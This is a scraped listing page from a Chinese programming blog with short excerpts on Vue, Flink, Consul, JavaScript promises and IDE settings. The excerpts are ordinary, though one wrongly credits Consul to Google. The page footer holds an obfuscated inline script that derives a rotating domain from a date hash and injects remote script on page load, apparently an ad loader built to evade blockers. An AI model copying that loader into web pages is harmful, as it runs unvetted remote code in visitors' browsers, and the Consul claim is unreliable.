所以只能另辟蹊径，找了其他方法，就是当键盘弹起时，设置这个弹框的位置向下移动，移动的高度为键盘的高度即可
在初始化时获取整个界面的可视区域，我这是在初始化查询的时候设置的高度，将这个值存起来，下面要用
然后获取键盘弹出时的高度，也存入一个值，这个方法可在mounted中调用，键盘弹起时这个方法会自动调用
然后再监听键盘的高度，用最开始的获取的可视高度-键盘弹起时的可视高度，就获取到了键盘的高度，
将最后获取到的值赋给键盘设置样式即可，这样子键盘弹起和收起时高度也不会变化了
下面看最后的演示
键盘弹起时界面不变形
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/527ac45cf439e078ab008835ff1292ba/" rel="bookmark">
			html/javascript-表格的创建和使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		html中表格的创建和使用 一 摘要二 使用html table标签创建表格（在html文件中）三 使用javascript创建表格（在js文件中）四 表格属性的设置：4.1. 右边框的设置：4.2. 只给表格单元格加右边框4.3. 动态设置右边框的风格 一 摘要 html经常使用到表格table。在HTML中创建和使用表格，可以直接在html定义标签，也可以使用DOM（文档对象模型）来动态创建和操作表格元素。
二 使用html table标签创建表格（在html文件中） &lt;table&gt; &lt;tr&gt; &lt;th&gt;Header 1&lt;/th&gt; &lt;th&gt;Header 2&lt;/th&gt; &lt;th&gt;Header 3&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Data 1&lt;/td&gt; &lt;td&gt;Data 2&lt;/td&gt; &lt;td&gt;Data 3&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;Data 4&lt;/td&gt; &lt;td&gt;Data 5&lt;/td&gt; &lt;td&gt;Data 6&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; 三 使用javascript创建表格（在js文件中） 下面是一个示例，展示了如何使用JavaScript创建一个简单的表格并向其添加数据：
function createTable() { // 创建一个table元素 var table = document.createElement("table"); // 创建表头行 var headerRow = document.createElement("tr"); // 创建表头单元格 var headerCell1 = document.createElement("th"); headerCell1.innerHTML = "Header 1"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/527ac45cf439e078ab008835ff1292ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ab73e236318cfd66b071dcbc8c44ff5/" rel="bookmark">
			Vue3选择器（Select）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Vue2选择器（Select）
可自定义设置以下属性：
选项数据（options），类型：Array&lt;Option&gt;，默认值 []，其中Option类型：{label?: string, value?: any, disabled?: boolean, [propName: string]: any}
选择器字典项的文本字段名（label），类型：string，默认 'label'
选择器字典项的值字段名（value），类型：string，默认 'value'
选择框默认文字（placeholder），类型：string，默认 '请选择'
是否禁用下拉（disabled），类型：boolean，默认 false
是否支持清除（allowClear），类型：boolean，默认false
是否支持搜索（search），类型：boolean，默认 false
过滤条件函数（filter），类型：Function|true，默认 true，仅当支持搜索时生效，根据输入项进行筛选，默认为 true 时，筛选每个选项的文本字段 label 是否包含输入项，包含返回 true，反之返回 false；当其为函数 Function 时，接受 inputValue option 两个参数，当 option 符合筛选条件时，应返回 true，反之则返回 false
选择框宽度（width），类型：number，默认200px
选择框高度（height），类型：number，默认36px
下拉面板最多能展示的下拉项数，超过后滚动显示（maxDisplay），类型：number，默认 6
当前选中的option条目（v-model:modelValue），类型：number|string|null，默认 null
效果如下图：在线预览
展开图：
支持搜索：
其中引入使用了 Vue3空状态（Empty） ①创建选择器组件Select.vue：
&lt;script setup lang="ts"&gt; import { ref, watchEffect, watch } from 'vue' import Empty from '../empty' interface Option { label?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2ab73e236318cfd66b071dcbc8c44ff5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16d49197dcd0dfa52e3380dc48716d68/" rel="bookmark">
			IDEA设置创建类和方法时的自定义注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 效果图示设置记录1、自定义类注解2、定义方法注解 效果图示 1.自定义类注释效果图:
2.自定义方法注释效果图:
设置记录 1、自定义类注解 第一种操作： File →Settings → 在左侧导航栏中点击Editor，然后点击File and Code Templates
注：此方式只对class有效
第二种操作： File→Settings → 在左侧导航栏中点击Editor → 文件和代码模板File and Code Templates→包含Includes→File Header
注：此方式在class、interface、Enum、Annotation都是有效的
/** * @Author Chenry.r * @Date ${DATE} ${TIME} * @Version 1.0 * @Description &lt;p&gt;备注：$description&lt;/p&gt; */ $ description 加上之后再创建类的时候会弹出一个框让你输入description、 如果不想这样可以把$ description 删掉 在创建类之后自己输入类的描述信息；
2、定义方法注解 1.通过Live Template自定义方法注释
操作： File→Settings → 在左侧导航栏中点击Editor →Live Templates
注意：切记不要加 /否则methodParameters()和methodReturnType()方法获取不到值
* * @Description: * * @Author: Chenry.r * @Date: $date$ $time$ $param$ $return$ */ 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16d49197dcd0dfa52e3380dc48716d68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58c8f58b8cb8c0aff0484a84ebe0cf04/" rel="bookmark">
			Flink回撤流
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.回撤流定义（RetractStream） Flink 的回撤流是指在 Flink 的流处理算法中，撤回已经发送到下游节点的数据。这是因为在实际应用场景中，有些错误数据可能会发送到下游节点，因此需要回撤流以保证数据的准确性。
回撤流可以理解为流式场景下对数据进行更新，这里的更新数据并不是将发往下游的历史数据进行更改，要知道，已经发往下游的消息是追不回来的。更新历史数据的含义是，在得知某个Key（接在Key BY / Group By后的字段）对应数据已经存在的情况下，如果该Key对应的数据再次到来，会生成一条delete消息和一条新的insert消息发往下游。
在 Flink 中，回撤流的功能可以通过 Flink 提供的事务性 API 来实现。该 API 可以对数据流进行事务支持，以确保数据的准确性。在发生错误时，可以回撤事务中的数据，以保证数据的准确性。
总的来说，Flink 的回撤流是一个非常有用的功能，可以用于保证数据准确性和可靠性，同时也可以提高 Flink 的稳定性和可靠性。
2.回撤流示例 流场景下的一个词频统计例子
没有retract会导致最终结果不正确
3.聚合算子回撤 聚合算子中包含两种状态，state 存储中间结果状态（如count(id)值）、cntState存储key对应的消息数量（聚合消息+1，回撤消息-1）。state用于不断更新中间聚合状态，cntState用于判断向下游发送当前新的聚合消息，还是上一次聚合消息对应的回撤消息。
4. Sink算子回撤 官方对于sink的插入模式有以下三种描述：
Append 模式：该模式用户在定义Sink的DDL时候不定义PK，在Apache Flink内部生成的所有只有INSERT语句；Upsert 模式：该模式用户在定义Sink的DDL时候可以定义PK，在Apache Flink内部会根据事件打标(retract机制)生成INSERT/UPDATE和DELETE 语句,其中如果定义了PK， UPDATE语句按PK进行更新，如果没有定义PK UPDATE会按整行更新；Retract 模式：该模式下会产生INSERT和DELETE两种信息，Sink Connector 根据这两种信息构造对应的数据操作指令； Sink算子是否支持回撤流，要根据sink数据源的特性而定。例如kafka sink只支持append模式，jdbc sink在Flink1.11中只支持upsert（不配置primary key会报错）。这都跟sink数据源的特性密切相关。
以Kafka Sink为例，Kafka是利用log中顺序追加消息的方式存储消息，因此只支持append模式，网上有修改kafka sink connector以支持upsert的方法：将聚合算子中的回撤消息（false）过滤掉，只留下聚合消息（true），并写入kafka，带来的现象就是一个聚合结果会多次出现在kafka中，算是一种阉割版的upsert模式。
结论：聚合算子和Sink算子关于回撤的概念相似，但原理不同且使用场景也不同，聚合算子的回撤用于聚合状态的更新，Sink算子的回撤则更多的是应用于CDC场景。
聚合算子的撤回机制，保证了FlinkSQL持续查询/增量查询的正确语义；而Sink算子的回撤机制，保证了CDC场景下的正确语义。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62fc1f513ca47e50cd7163bad6e22407/" rel="bookmark">
			【Docker consul的容器服务更新与发现】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、Consul 的简介（1）什么是服务注册与发现（2）什么是consul 二、consul 部署1、consul服务器1. 建立 Consul 服务2. 查看集群信息3. 通过 http api 获取集群信息 2、registrator服务器1. 安装 Gliderlabs/Registrator2. 测试服务发现功能是否正常3. 验证 http 和 nginx 服务是否注册到 consul 3、consul-template1. 准备 template nginx 模板文件2. 编译安装nginx3. 配置 nginx4. 配置并启动 template5. 访问 template-nginx6. 增加一个 nginx 容器节点 4、consul 多节点 一、Consul 的简介 （1）什么是服务注册与发现 服务注册与发现是微服务架构中不可或缺的重要组件。起初服务都是单节点的，不保障高可用性，也不考虑服务的压力承载，服务之间调用单纯的通过接口访问。直到后来出现了多个节点的分布式架构，起初的解决手段是在服务前端负载均衡，这样前端必须要知道所有后端服务的网络位置，并配置在配置文件中。这里就会有几个问题：
●如果需要调用后端服务A-N，就需要配置N个服务的网络位置，配置很麻烦
●后端服务的网络位置变化，都需要改变每个调用者的配置
既然有这些问题，那么服务注册与发现就是解决这些问题的。后端服务A-N可以把当前自己的网络位置注册到服务发现模块，服务发现就以K-V的方式记录下来，K一般是服务名，V就是IP:PORT。服务发现模块定时的进行健康检查，轮询查看这些后端服务能不能访问的了。前端在调用后端服务A-N的时候，就跑去服务发现模块问下它们的网络位置，然后再调用它们的服务。这样的方式就可以解决上面的问题了，前端完全不需要记录这些后端服务的网络位置，前端和后端完全解耦！
解决什么问题？
如果后端应用服务器集群节点数量很多，负载均衡器配置和管理会很麻烦的问题
（负载均衡器的节点配置条目数量众多，后端节点的网络位置发生变化还需要修改所有使用这些后端节点的负载均衡器配置等问题）
（2）什么是consul consul是google开源的一个使用go语言开发的服务管理软件。支持多数据中心、分布式高可用的、服务发现和配置共享。采用Raft算法，用来保证服务的高可用。内置了服务注册与发现框架、分布一致性协议实现、健康检查、Key/Value存储、多数据中心方案，不再需要依赖其他工具（比如ZooKeeper等）。服务部署简单，只有一个可运行的二进制的包。每个节点都需要运行agent，他有两种运行模式server 和 client。 每个数据中心官方建议需要3或5个server节点以保证数据安全，同时保证server-leader的选举能够正确的进行。
●在client模式下，所有注册到当前节点的服务会被转发到server节点，本身是不持久化这些信息。
●在server模式下，功能和client模式相似，唯一不同的是，它会把所有的信息持久化到本地，这样遇到故障，信息是可以被保留的。
●server-leader是所有server节点的老大，它和其它server节点不同的是，它需要负责同步注册的信息给其它的server节点，同时也要负责各个节点的健康监测。
consul 模式总结
●client模板：负责转发注册信息给server节点，没有持久化能力
●server模式：在server节点之间同步注册信息，持久化注册信息
●server-leader节点：负责转发注册信息给其它server节点，对各节点健康检查
consul提供的一些关键特性：
服务注册与发现：consul通过DNS或者HTTP接口使服务注册和服务发现变的很容易，一些外部服务，例如saas提供的也可以一样注册。
健康检查：健康检测使consul可以快速的告警在集群中的操作。和服务发现的集成，可以防止服务转发到故障的服务上面。
Key/Value存储：一个用来存储动态配置的系统。提供简单的HTTP接口，可以在任何地方操作。
多数据中心：无需复杂的配置，即可支持任意数量的区域。
安装consul是用于服务注册，也就是容器本身的一些信息注册到consul里面，其他程序可以通过consul获取注册的相关服务信息，这就是服务注册与发现。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/62fc1f513ca47e50cd7163bad6e22407/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f1f07c3e25de9215fdf0c89175441c6/" rel="bookmark">
			vue的Element组件上传文件el-upload上传成功后清空
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;el-upload action="#" ref="upload" list-type="picture" :show-file-list="true" :limit="1" :http-request="handleUpload"&gt; &lt;el-button size="small" type="primary"&gt;点击上传&lt;/el-button&gt; &lt;/el-upload&gt; 上传完成后执行清空
this.$refs.upload.clearFiles() 或者
const mainImg = this.$refs.upload if (mainImg &amp;&amp; mainImg.length) { mainImg.forEach(item =&gt; { item.clearFiles() }) } 如果有多个组件可以使用：file-list，可以设置file-list="[]"
&lt;el-upload action="#" ref="upload" :file-list="normal" list-type="picture" :show-file-list="true" :limit="1" :http-request="uploadAvatarNormal"&gt; &lt;el-button size="small" type="primary"&gt;点击上传图片&lt;/el-button&gt; &lt;/el-upload&gt; 然后清空normal字段即可
还有种情况是需要修改组件key来实现清空的
timer: '', &lt;ImageCropping :imageUrl="companyform.imageUrl" @change="uploadHandler" imgType="imageUrl" :key="timer"/&gt; 其中timer是需要修改的，每次新增或修改的时候修改timer的值即可
/** 新增按钮操作 */ handleAdd() { this.reset() this.open = true this.timer = new Date().getTime() this.title = '添加信息' }, 解决了之后可以给自己放松下，玩下这个解压的微信小游戏
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af185a16c1fcd36e5c121e45e94fe5cf/" rel="bookmark">
			js 使用promise函数返回值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 如果封装复用一个请求接口的函数，要有返回值，在then（）里面直接return，返回的是个无法使用的promise对象，解决方法：
此时应该新建一个promise对象，return resolve（），调用函数正常获取并使用返回值，
一个promise函数，如果使用 await 和 async 组合，那么它的父级的父级被调用都要加 async 和 await 。
使用async，await 只有一个返回值，无法捕获异常：
第一种解决方法此时应使用promise，执行reject()throw new Error(error)，不会执行then()，在catch()里可以捕获到 getData(a){ return new Promise((resolve, reject) =&gt; { if(a&gt;2) { resolve(a) } else { reject('不大于2') } }) } let a = await getData(1).catch(res=&gt;{ console.log(res) // 不大于2 }); console.log(a) // undefined let a = await getData(3).catch(res=&gt;{ console.log(res) // 不执行 }); console.log(a) // 3 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5caa665bfad746f7d5b53fc2d4cdf33/" rel="bookmark">
			FastGithub 下载
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Releases · dotnetcore/FastGithub · GitHub
无需安装，双击UI程序即可运行。 
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/59/">«</a>
	<span class="pagination__item pagination__item--current">60/306</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/61/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>